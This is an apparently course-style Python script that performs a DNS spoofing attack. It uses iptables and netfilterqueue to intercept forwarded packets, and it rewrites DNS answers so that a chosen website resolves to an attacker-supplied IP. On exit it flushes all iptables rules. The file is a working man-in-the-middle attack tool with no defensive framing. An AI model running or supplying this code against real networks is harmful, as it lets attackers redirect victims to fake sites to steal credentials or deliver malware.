#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-w", "--website", dest="website", help="Website to run the DNS_spoof")
    parser.add_option("-t", "--target_ip", dest="target_ip", help="ip to replace original website ip")
    (option, arguments) = parser.parse_args()
    if not option.website:
        parser.error("\n[-] Please specify the website to run dns spoof attack, use --help for more info")
    elif not option.target_ip:
        parser.error("\n[-] Please specify the target website, use --help for more info")
    return option


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if website in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata=target_web_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()


website = get_arguments().website
target_web_ip = get_arguments().target_ip
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
try:
    print("[+] DNS Spoof started on " + website + " --> " + target_web_ip)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting DNS tables")
    subprocess.call("iptables --flush", shell=True)


# iptables -I FORWARD -j NFQUEUE --queue-num 0      //Create a queue with arp spoof
# iptables -I INPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc input packet
# iptables -I OUTPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc output packet
# iptables --flush      //To delete the queue
